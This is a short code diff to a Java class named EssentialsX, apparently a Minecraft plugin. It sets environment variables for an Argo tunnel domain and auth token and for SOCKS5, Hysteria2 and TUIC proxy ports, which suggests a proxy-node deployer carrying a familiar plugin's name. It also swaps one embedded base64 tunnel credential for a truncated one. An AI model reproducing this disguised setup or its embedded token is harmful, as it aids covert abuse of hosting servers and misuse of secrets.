@@ -76,7 +76,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "idc.colorrora.com");
-        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiYzk0MGVkYzEtNzMyZi00NmRkLWI2ZjYtMmMzYzQ0ZmI3OThmIiwicyI6IlpEQXdaREl3TnpRdE1HTTRaUzAwTlRaa0xUZzRZelV0T0dSaFpEZGxZemc0TVdJdyJ9");
+        env.put("ARGO_AUTH", "yI6IlpEQXdaREl3TnpRdE1HTTRaUzAwTlRaa0xUZzRZelV0T0dSaFpEZGxZemc0TVdJdyJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
